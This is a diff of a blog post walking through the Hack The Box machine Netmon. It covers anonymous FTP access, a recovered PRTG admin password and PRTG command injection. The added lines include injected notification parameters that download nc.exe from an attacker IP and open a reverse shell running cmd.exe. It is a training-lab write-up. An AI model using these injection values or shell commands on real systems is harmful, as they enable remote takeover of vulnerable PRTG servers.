@@ -2,7 +2,7 @@
 layout: post
 title: "Netmon: Hack The Box Walkthrough"
 date: 2019-06-30 05:27:39 +0000
-last_modified_at: 2019-06-30 05:41:08 +0000
+last_modified_at: 2019-06-30 05:45:29 +0000
 category: Walkthrough
 tags: ["Hack The Box", Netmon, retired]
 comments: false
@@ -17,11 +17,11 @@ This post documents the complete walkthrough of Netmon, a retired vulnerable [VM
 
 <!--more-->
 
-## Background
+### Background
 
-Netmon is a retired vulnerable VM from Hack The Box.
+Netmon is an active vulnerable VM from Hack The Box.
 
-## Information Gathering
+### Information Gathering
 
 Let’s start with a `masscan` probe to establish the open ports in the host.
 
@@ -110,63 +110,83 @@ Host script results:
 
 Since anonymous FTP login is allowed, let's go with that first.
 
-## File Transfer Protocol
+### File Transfer Protocol
 
 To my pleasant surprise, `C:\Users\Public` is available.
 
 <a class="image-popup">
-![2f8bf31c.png](/assets/images/posts/netmon-htb-walkthrough/2f8bf31c.png)
+![2f8bf31c.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/2f8bf31c.png)
 </a>
 
 And guess what, `user.txt` is here!
 
 <a class="image-popup">
-![90a90b90.png](/assets/images/posts/netmon-htb-walkthrough/90a90b90.png)
+![90a90b90.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/90a90b90.png)
 </a>
 
-## PRTG Network Monitor
+### PRTG Network Monitor
 
 Moving on to the `http` service, this is how it looks like.
 
 <a class="image-popup">
-![542fe300.png](/assets/images/posts/netmon-htb-walkthrough/542fe300.png)
+![542fe300.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/542fe300.png)
 </a>
 
 In conjuntion with the official security [advisory](https://www.paessler.com/about-prtg-17-4-35-through-18-1-37) and the [location](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) of the various configuration files, I was able to uncover a plaintext password from the file below.
 
 <a class="image-popup">
-![adca4be4.png](/assets/images/posts/netmon-htb-walkthrough/adca4be4.png)
+![adca4be4.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/adca4be4.png)
 </a>
 
 Here's the plaintext password.
 
 <a class="image-popup">
-![56c19c7a.png](/assets/images/posts/netmon-htb-walkthrough/56c19c7a.png)
+![56c19c7a.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/56c19c7a.png)
 </a>
 
-And since this is a backup and knowing administrators increment the year for convenience's sake, the password may be `PrTg@dmin2019`. Let's give it a shot.
+And since this is a backup and knowing many administrators increment the year for convenience's sake, the password may be `PrTg@dmin2019`. Let's give it a shot.
 
 <a class="image-popup">
-![3214f2a7.png](/assets/images/posts/netmon-htb-walkthrough/3214f2a7.png)
+![3214f2a7.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/3214f2a7.png)
 </a>
 
 Awesome.
 
-## PRTG < 18.2.39 Command Injection Vulnerability
+### PRTG < 18.2.39 Command Injection Vulnerability
 
 During my research for vulnerability related to PRTG, I chanced upon this [blog](https://www.codewatch.org/blog/?p=453) discussing command injection vulnerability, with `SYSTEM` privileges no less.
 
-Follow the instructions to create a notification with the following parameters.
+Follow the instructions to create a custom notification with the following parameters.
 
 ```
-test.txt; type c:\users\administrator\desktop\root.txt > c:\users\public\downloads\success.txt
+test.txt; Invoke-WebRequest http://10.10.15.200/nc.exe -OutFile c:\Users\Public\Downloads\nc.exe
 ```
 
-Download `success.txt` from FTP and the content of `root.txt` is as follows.
+If you've read the blog carefully, you'll realize certain characters are encoded. As such, I'm avoiding certain bad characters, if you will, to download a copy of `nc.exe` to `c:\Users\Public\Downloads` with PowerShell.
+
+Verify that `nc.exe` is indeed downloaded.
 
 <a class="image-popup">
-![4de3a597.png](/assets/images/posts/netmon-htb-walkthrough/4de3a597.png)
+![e26dd675.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/e26dd675.png)
 </a>
+
+Next, we use the following parameters to run a reverse shell back to us.
+
+```
+test.txt; c:\Users\Public\Downloads\nc.exe 10.10.15.200 1234 -e cmd.exe
+```
+
+<a class="image-popup">
+![4b13a195.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/4b13a195.png)
+</a>
+
+Getting `root.txt` is trivial when you have `SYSTEM` privileges.
+
+<a class="image-popup">
+![4d1f295b.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/4d1f295b.png)
+</a>
+
+:dancer:
 
 :dancer:
 
